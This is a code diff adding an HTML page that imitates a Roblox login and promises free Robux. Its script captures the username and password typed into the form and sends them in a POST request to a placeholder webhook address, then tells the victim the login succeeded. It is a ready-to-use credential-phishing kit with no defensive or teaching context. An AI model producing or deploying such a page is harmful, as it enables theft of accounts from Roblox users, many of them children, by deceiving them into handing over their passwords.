@@ -1,0 +1,51 @@
+<html>
+<head>
+<title>Roblox Login</title>
+<style>
+body {
+    font-family: Arial, sans-serif;
+    background-color: #f2f2f2;
+}
+</style>
+</head>
+<body>
+<h1>Roblox Login</h1>
+<h2>Log in to your account to get the Robux sent there</h2>
+<form action="" method="POST">
+<label for="username">Username:</label>
+<input type="text" id="username" name="username"><br><br>
+<label for="password">Password:</label>
+<input type="password" id="password" name="password"><br><br>
+<input type="submit" value="Login">
+</form>
+<div id="error"></div>
+<script>
+const form = document.querySelector('form');
+const errorDiv = document.querySelector('#error');
+form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const formData = new FormData(form);
+    const username = formData.get('username');
+    const password = formData.get('password');
+    
+    // Send login details to webhook
+    const response = await fetch('https://your-webhook-url.com', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ username, password })
+    });
+
+    if (!response.ok) {
+        errorDiv.textContent = 'Error: Invalid username or password.';
+        errorDiv.style.color = 'red';
+    } else {
+        // Handle successful login response
+        errorDiv.textContent = 'Login successful!';
+        errorDiv.style.color = 'green';
+    }
+});
+</script>
+</body>
+</html>
